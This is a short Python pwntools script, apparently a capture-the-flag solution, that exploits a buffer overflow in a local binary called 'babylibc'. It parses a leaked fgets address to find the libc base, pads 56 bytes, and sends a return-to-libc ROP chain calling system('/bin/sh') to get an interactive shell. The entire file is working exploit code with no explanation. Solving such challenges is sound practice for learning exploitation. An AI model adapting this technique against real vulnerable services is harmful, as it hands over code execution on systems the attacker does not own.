#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./babylibc")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process("./babylibc")
p.recvuntil("help! ")
p.recvline()
leak_fgets = p.recvuntil(" ").strip().decode()
log.info("leak_fgets %s" %leak_fgets)
p.recvline()
leak_fgets = int(leak_fgets,16)
libc.address = leak_fgets - libc.sym.fgets
system = libc.sym.system
binsh = next(libc.search(b"/bin/sh"))
offset = 56
pop_rdi = 0x000000000040120b

junk = b'a'*offset
rop_chain = p64(pop_rdi) + p64(binsh) + p64(system)
payload = junk + rop_chain
p.sendline(payload)
p.interactive()